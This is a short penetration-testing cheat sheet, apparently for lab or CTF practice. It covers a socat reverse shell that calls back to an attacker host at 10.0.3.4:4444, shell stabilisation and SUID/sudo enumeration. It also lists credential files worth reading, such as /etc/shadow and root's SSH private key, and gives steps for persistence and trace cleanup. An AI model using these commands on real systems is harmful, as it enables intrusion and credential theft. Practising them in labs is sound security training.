# Cheat Sheet
___________

    Recon - Scan for vulnarable targets, gather info on target.
    Collect - Enumeration, more enumeration and some more enumeration.
    Process - Sort through data, analyse and prioritisation.
    Search - Know what to search for and where to find the exploit code.
    	Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
    	Locating other services running or applications installed that may be abusable (SUID & out of date software)
    	Looking for automated scripts like backup scripts (exploiting crontabs)
    	Credentials (user accounts, application config files..)
    	Mis-configured file and directory permissions
    Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
    Try - Get ready for (lots of) trial and error.
    Stay - Get a permanent foothold
    Cleanup - Leave no trace behinde
___________

## Stabilize Shell
```
python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

stty raw -echo; fg
```
## Get reverse shell
atk:
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
victim:
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
## Useful enumeration comands
List all processes runing as root
```
ps -aux | grep root
```
List all executibles with SUID set
```
find / -perm -u=s -type f 2>/dev/null
```
List what can be run with higher privileges
```
sudo -l
```
## Usefull common Linux commands

Make file executable
```
chmod +x filename
```
Double click in terminal
```
xdg-open [FILENAME]
```
What shell am I using
```
echo $0
```
Only show matches
```
2> /dev/null
```
Execute command/use file as another user
```
sudo -u "username" "path/to/command" "path/to/file"
```
## Python helper
Start a quick HTTP server
```
python3 -m http.server [PORT]
```
Spawn a shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
## Other Stuff

### Dirbuster

List of common file extentions
```
php, pl, sh, asp, html, json, py, cfm, aspx, rb, cgi
```
## Useful Places to look

Location	Description

/etc/issue
	contains a message or system identification to be printed before the login prompt.

/etc/profile
	

controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived

/proc/version
	specifies the version of the Linux kernel

/etc/passwd
	has all registered user that has access to a system

/etc/shadow
	contains information about the system's users' passwords

/root/.bash_history
	

contains the history commands for root user

/var/log/dmessage
	contains global system messages, including the messages that are logged during system startup

/var/mail/root
	

all emails for root user

/root/.ssh/id_rsa
	Private SSH keys for a root or any known valid user on the server

/var/log/apache2/access.log
	

the accessed requests for Apache  webserver

C:\boot.ini
	contains the boot options for computers with BIOS firmware
